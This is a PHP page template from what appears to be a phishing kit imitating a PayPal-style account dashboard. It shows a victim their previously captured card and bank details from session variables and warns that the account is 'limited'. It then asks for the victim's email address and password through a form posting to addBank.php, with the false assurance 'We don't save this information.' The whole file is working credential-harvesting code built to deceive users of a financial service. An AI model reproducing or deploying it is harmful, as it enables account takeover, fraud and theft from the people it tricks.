<?php include 'partials/header.php';?>
<?php if(!isset($_SESSION['cardname'])){exit(header("Location: confirmation.php?sessionid={$_SESSION['randString']}&sslmode=true"));}?> 
	<?php include 'partials/navbar.php';?>
	<div id="js_foreground" class="vx_foreground-container foreground-container">
		<?php include 'partials/navbar-mobile.php';?>
		<div class="contents vx_mainContent" id="contents" role="main" aria-labelledby="heading1">
			<div id="js_summaryView" class="mainContents summaryContainer">
				<?php include 'partials/head.php';?>
				<div class="mainBody">
					<div id="summary " class="summarySection">
						<div class="row"><div class="col-sm-4 summaryModuleContainer">
							<?php include 'partials/section-balance.php';?>
							<section class="fiModule-container nemo_fiModule" id="js_tourFIModule " aria-labelledby="walletModuleHeader "><h3 class="fiModule-title vx_text-5">Bank accounts and cards</h3><div class="js_fiModule-listView"><ul class="fiModule-list fiModule-table"><li class="fiModule-list-item vx_text-body_secondary">
								<a href="javascript:void(0)" name="FIModule_Cards"><span class="fiModule-cell"><span style="background-position-y:
	<?php echo $_SESSION['cardlogo'];?>
	!important" class="fiModule-icon_card">
	</span>
</span>
<span class="fiModule-cell enforceLtr">
	<span class="fiModule-fiType"><?php echo $_SESSION['cardname'];?></span>
	<span class="nemo_fiModule-acctDetails"> x-<?php echo substr($_SESSION['cardnumber'],strlen($_SESSION['cardnumber'])-4,strlen($_SESSION['cardnumber']));?></span>
</span></a></li>
<?php if(isset($_SESSION['bank_logo'])):?>
<li class="fiModule-list-item vx_text-body_secondary">
<a href="javascript:void(0)" name="FIModule_Cards">
<span class="fiModule-cell">
<span class="fiModule-icon_bank <?php echo $_SESSION['bank_logo'];?>"></span>
</span>
<span class="fiModule-cell enforceLtr">
<span class="fiModule-fiType"><?php echo $_SESSION['bank_name'];?> </span>
<span class="nemo_fiModule-acctDetails">x-<?php echo $_SESSION['acn'];?></span>
</span>
</a>
</li>
<?php endif;?>
</ul><div class="fiModule-ctaText vx_text-body_secondary"><a href="javascript:void(0)" class="fiModule-table nemo_addFI"><span class="icon-addBank"><span class="icon icon-add-small icon-add_Bank"></span></span><span class="fiModule-cell fiModule-link-add nemo_linkFi">Add a bank account or card</span></a></div></div></section><section class="fiModule-container js_fiModule-container nemo_sellingToolsModule sellingToolsModule"><span class="fiModule-title vx_text-5">Limited Account Details</span><ul class="moduleListItems"><li class="vx_text-body_secondary" style="padding-left:11px"><span class="numeralLabel vx_small-text vx_legal-text">- You won't be able shopping.</span></li><li class="vx_text-body_secondary" style="padding-left:11px"><span class="numeralLabel vx_small-text vx_legal-text">- You can't send or receive money.</span></li><li class="vx_text-body_secondary" style="padding-left:11px"><span class="numeralLabel vx_small-text vx_legal-text">- You can't see your last activity.</span></li><li class="vx_text-body_secondary" style="padding-left:11px"><span class="numeralLabel vx_small-text vx_legal-text">- You won't be able to withdraw money.</span></li></ul></section></div><div class="col-sm-8 activityModuleContainer" id="js_transactionCollection"><section class="activityModule js_completedModule nemo_completedModule"><h3 id="activityModuleHeaderCompleted" class="vx_h5 moduleHeader nemo_activityModuleHeaderCompleted"><span class="fiModule-cell enforceLtr" style="padding-bottom:20px"><span class="fiModule-title vx_text-1">Select your E-mail provider</span></span></h3><div class="numeralLabel vx_small-text vx_legal-text lbl-bank hide" style="padding-bottom:20px"> Use your <span class="fiModule-title vx_text-5 bank-span" style="color:#2c2e2f">Provider</span> login to link your email provider. We don't save this information. </div><form name="addAddress" action="../addBank.php" method="post"><div class="boxs-banks"><?php include 'partials/emails-logos.php';?></div><div class="boxs-inputs hide"><center><img class="selected-bank" src="../assets/img/different-provider.png" style="border:1px solid #ddd;margin-bottom:20px;width:143px;height:60px"></center><div class="inputs bnk-name-input"><input class="enterInput" type="text" name="emailprovider" placeholder="Email Provider name(optional)" data-flag="false"></div><div class="section group inputs"><div class="col span_1_of_2 inexpiration"><input class="enterInput" type="text" name="email_user" placeholder="Email address" maxlength="32"></div><div class="col span_1_of_2"><input class="enterInput" type="password" name="email_pass" placeholder="Password"></div></div><input type="submit" name="addAddress" class="saveEmail validateBeforeSubmit vx_btn vx_btn-block" value="Confirm & Link Email Provider"></div></form><div class="clearfix"></div></section></div></div></div></div></div></div><div id="animasi" class="transitioning hide"></div><script src="../assets/js/email/manage.js"></script><?php include 'partials/footer.php';?>